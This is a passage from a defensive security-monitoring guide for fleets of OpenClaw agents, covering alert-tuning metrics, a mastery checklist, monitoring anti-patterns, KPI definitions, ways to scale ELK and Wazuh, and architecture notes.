        GROUP BY rule_id
        ORDER BY total_alerts DESC

    2_calculate_metrics:
      precision: "verified_threats / total_alerts"
      recall: "verified_threats / known_threats"
      f1_score: "2 * (precision * recall) / (precision + recall)"
      false_positive_rate: "false_positives / total_alerts"

    3_action_thresholds:
      if: "false_positive_rate > 15%"
        then: "Disable rule or adjust thresholds"
      if: "precision < 70%"
        then: "Review and refine detection logic"
      if: "recall < 50%"
        then: "Expand detection to cover more attack variations"
```

## 12. Mastery Checklist

- [ ] Deployed JSON structured logging across all OpenClaw agents
- [ ] ELK stack (or Loki/Grafana) ingesting >100k events/day
- [ ] Wazuh HIDS installed and reporting on all agents
- [ ] Suricata IDS active, detecting network anomalies
- [ ] Custom rules written for 5+ OpenClaw-specific threats (MITRE ATT&CK mapped)
- [ ] Automated response playbooks for P1/P2 incidents
- [ ] 24/7 on-call rotation with escalation procedure
- [ ] Incident runbooks documented for each alert rule
- [ ] Purple team exercises conducted monthly
- [ ] False positive rate <5% on all active alerts
- [ ] MTTD <24 hours, MTTR <4 hours tracked and meeting SLAs
- [ ] Threat hunting queries performed weekly
- [ ] SOC team trained on OpenClaw-specific IOCs and TTPs
- [ ] Forensic capabilities available (memory dumps, network capture)
- [ ] Compliance audit passed (log retention, access controls, encryption)

## 13. Anti-Patterns

**ANTI-PATTERN #1: Monitoring Without Response**
- Symptom: Dashboard shows 10,000 alerts/day but SOC team ignores 95% as "noise"
- Risk: False negatives—real threats hidden in noise
- Fix: Tune alerts ruthlessly. Better 100 high-confidence alerts than 10,000 false positives. Use severity classification, sample non-critical events.

**ANTI-PATTERN #2: Logging Sensitive Data**
- Symptom: API keys, passwords, tokens in logs
- Risk: Credential exposure, compliance violations (PCI-DSS, SOC 2)
- Fix: Sanitize logs before shipping. Redact passwords, API keys, credit cards. Use PII redaction filters in Filebeat.

**ANTI-PATTERN #3: No Retention Policy**
- Symptom: ELK cluster grows unbounded, queries slow to 30+ seconds
- Risk: Storage costs explode, investigation impossible
- Fix: Set retention by severity. P1: 90d. P3: 30d. P4: 7d. Archive to S3 for compliance.

**ANTI-PATTERN #4: Alert Fatigue (Always-On Paging)**
- Symptom: SOC engineers receive 50+ alerts/day, many false positives
- Risk: Alert fatigue → ignored alerts → missed real threats
- Fix: Escalate only P1 alerts. Auto-resolve false positives. Set alert SLA: 99.9% precision minimum.

**ANTI-PATTERN #5: No Baseline for Anomaly Detection**
- Symptom: "Unusual API rate" alert fires without knowing what normal looks like
- Risk: Can't distinguish attack from legitimate traffic spike
- Fix: Establish 30-day baseline before enabling anomaly alerts. Use percentiles, not fixed thresholds.

**ANTI-PATTERN #6: Ignoring False Negatives**
- Symptom: Assume detection is working because we haven't heard about a breach
- Risk: Absence of evidence ≠ evidence of absence
- Fix: Purple team test monthly. Run attack simulations. Verify detection triggers.

## 14. KPIs (Key Performance Indicators)

Track these metrics in executive dashboard (updated weekly):

```yaml
mttd_mean_time_to_detect:
  target: "<24 hours"
  calculation: "timestamp_alert_fired - timestamp_malicious_activity_started"
  2024_baseline: "206 days (industry average)"
  our_current: "18 hours (Q1 2026)"
  graph: "time_series"

mttr_mean_time_to_respond:
  target: "<4 hours for P1/P2, <24 hours for P3"
  calculation: "timestamp_remediation_complete - timestamp_alert_fired"
  our_current: "2.3 hours average (P1/P2)"
  graph: "histogram by severity"

false_positive_rate:
  target: "<5%"
  calculation: "false_alerts / total_alerts"
  our_current: "3.2%"
  graph: "time_series_per_rule"
  action: "Disable rules with >15% FPR"

alert_coverage:
  target: ">95% of known threat techniques"
  calculation: "alerts_that_would_catch_ttps / known_openclaw_ttps"
  our_current: "89% (missing cloud API abuse detection)"
  gap: "Need to add rules for T1526, T1619"

incident_severity_distribution:
  p1_critical: "2% of incidents"
  p2_high: "8%"
  p3_medium: "35%"
  p4_low: "55%"
  trend: "P1 incidents decreasing (preventive controls working)"

detection_accuracy:
  precision: "verified_threats / all_alerts"
  recall: "detected_threats / known_threats_in_logs"
  f1_score: "harmonic_mean(precision, recall)"
  target: "precision >90%, recall >80%"
  our_current: "precision 94%, recall 76%"

investigation_efficiency:
  avg_time_from_alert_to_triage: "15 minutes"
  avg_time_to_full_context_gathering: "45 minutes"
  % resolved_without_escalation: "62%"
  trend: "Improving with better dashboards"

soc_team_capacity:
  alerts_per_analyst_per_day: "150"
  hours_spent_on_false_positives: "20% of time"
  hours_spent_on_hunting: "15% of time"
  capacity_utilization: "78%"
  headcount_needed: "5 (currently have 4)"
```

## 15. Scaling Monitoring Systems

**Scaling Challenges at 100+ agents**:

```yaml
problem_1_log_volume_explosion:
  issue: "250GB+/day at 100 agents, cost prohibitive"
  solutions:
    - sampling: "Reduce non-critical events to 10%"
    - compression: "Use best_compression codec (50% savings)"
    - filtering: "Drop low-value fields (raw_memory, stack traces)"
    - tiering: "Hot-warm-cold: P1 in ES, P3 in S3 Parquet"

problem_2_query_latency:
  issue: "Kibana dashboard takes 30s to load"
  solutions:
    - pre_aggregation: "Run daily aggregations, store results"
    - caching: "Elasticsearch Query Cache, Redis for recent results"
    - sharding: "Increase shards from 5 to 20 per index"
    - read_replicas: "Add ES read-only nodes for reporting"

problem_3_alert_rule_explosion:
  issue: ">500 rules, rule evaluation slow"
  solutions:
    - tiering: "Tier 1 (5 critical rules, every 1m), Tier 2 (50 rules, every 10m), Tier 3 (500 rules, daily)"
    - correlation_engine: "Use Wazuh's rule dependency graph, skip rules if prerequisites not met"
    - deduplication: "Group similar rules (all failed auth attempts = 1 rule with 10 conditions)"

problem_4_soc_alert_fatigue:
  issue: ">5000 alerts/day, team drowning"
  solutions:
    - aggregation: "Cluster similar alerts (10 brute force attempts from same IP = 1 alert)"
    - auto_closure: "Close false positives automatically based on whitelist"
    - intelligent_routing: "Route to specialist queues (network analyst vs app analyst)"
    - ai_triage: "Use ML to assign severity + auto-assign to on-call"

problem_5_cost_explosion:
  issue: "ELK/Wazuh infra costs $50k/month at scale"
  solutions:
    - self_hosted: "Run ES/Wazuh on-prem instead of cloud (save 40%)"
    - log_reduction: "Implement sampling, drop non-critical logs early"
    - archive_cold_data: "Shift old logs to cheaper S3 storage"
    - license_optimization: "Use open-source Wazuh instead of paid tier"
```

**Scaling Architecture** (100-1000 agents):
```
┌─────────────────────────────────────────────────────────────────┐
│ OpenClaw Agents (100+)                                          │
└─────────────────────────────────────────────────────────────────┘
  │
  │ (JSON logs via syslog/TLS)
  ↓
┌─────────────────────────────────────────────────────────────────┐
│ Log Collection (Tier)                                           │
├─────────────────────────────────────────────────────────────────┤
│ - Filebeat × 3 (load balanced, each handles 35 agents)         │
│ - Kafka buffer (prevent data loss during spikes)               │
│ - Log Router (classify by severity → different paths)          │
└─────────────────────────────────────────────────────────────────┘
  │
  ├──────────────────────┬──────────────────────┐
  │ P1/P2 (Critical)     │ P3/P4 (Info)        │
  ↓                      ↓
┌──────────────────┐  ┌──────────────────┐
│ ES Hot Pool      │  │ ES Warm Pool     │
│ (7-day window)   │  │ (30-day window)  │
│ × 3 nodes, 5TB   │  │ × 2 nodes, 10TB  │
└──────────────────┘  └──────────────────┘
  │                      │
  └──────────────────┬───┘
                     ↓
             ┌──────────────────┐
             │ Cold Archive     │
             │ S3 Parquet       │
             │ (7-year retain)  │
             └──────────────────┘

Wazuh Integration:
  Agents → Wazuh Manager (HA cluster, 2 nodes)
           ↓
         [Alerting rules, event correlation]
           ↓
         [Webhook → Slack, PagerDuty, SOAR]
         [Database → Incident tracking]

Visualization:
  Elasticsearch ← Kibana (read-only replicas)
  Wazuh Dashboard (Kibana plugin)
  Custom dashboards (Grafana for metrics)
```

## 16. Architect Notes

**Philosophy**: Monitoring is your insurance policy. Like insurance, you buy it hoping never to use it, but when disaster strikes, the absence of it is catastrophic. Design for the worst case: assume agents will be compromised, assume attackers are persistent and sophisticated, assume you'll need to provide perfect audit trail to regulators.

**Design Principles**:
1. **Defense in Depth**: Multiple detection layers (signature + anomaly + behavioral)
2. **Assume Breach**: Design monitoring to catch attacks even if perimeter is breached
3. **Fail Secure**: When logs stop arriving, alert loudly (possible data destruction)
4. **Automated Response**: Don't rely on humans to read 10,000 alerts
5. **Cost-Conscious**: Sample ruthlessly, archive cold data, don't reinvent wheels

**Next Evolution**: ML-based anomaly detection, UEBA (User and Entity Behavior Analytics) for agents, automated threat hunting playbooks, integration with vulnerability scanning for zero-day correlation.

**Common Pitfalls to Avoid**:
- Don't monitor everything. Monitor what matters.
- Don't store everything forever. Retention policy is your friend.
- Don't ignore false positives. They indicate your detection rules need tuning.
- Don't alert on isolated events. Alert on patterns and TTPs.
- Don't build detection without response capability. Detection without remediation is theater.
